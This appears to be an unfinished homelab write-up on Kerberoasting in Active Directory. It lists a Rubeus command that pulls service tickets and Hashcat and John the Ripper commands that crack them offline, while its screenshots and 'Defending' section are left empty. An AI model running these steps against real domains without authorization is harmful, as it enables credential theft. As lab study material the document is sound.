# Kerberoasting

## Objective

Kerberos uses Service Principal Names (SPNs) to link service instances to logon accounts, allowing client applications to request authentication without knowing the account name. Kerberoasting exploits this by obtaining a Ticket Granting Service (TGS) ticket, which is encrypted with the service account's NTLM hash, and then performing offline password cracking.

### Skills Learned

- Active Directory
- Domain Policy
- Domain Functional Levels
- Password Policy
- Kerberos Delegation

### Tools Used

- Windows Server DC
- PKI
- Kali Linux
- Rubeus
- Hashcat
- Event Viewer

## Exploit
  Rubeus can be used to obtain crackable tickets.
  ```
  Rubeus.exe kerberoast /outfile:spn.txt
  ```
  INSERT SCREEN SHOT
  
Once the tickets are obtained then it's time to crack them.  We can use two tools for this:
  - Hashcat
  - JackTheRipper

#### Hashcat
  This is possible using mode (-m) 13100 for a Kerberoastable TGS (Ticket Granting Service).
  
  ``` hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt``` -- If hashcat gives an error the option.
  ```--force``` may be necessary.
  
  Once Hashcat finishes cracking, the output will show the password in plain text:
  INSERT SCREENSHOT

#### John The Ripper
  Captured TGS hashes can be cracked just the same:
  ``` sudo john spn.txt --fork=4 --format=krb5tgs --wordlist=passwords.txt --pot=results.pot```
  INSERT SCREENSHOT

  
## Defending
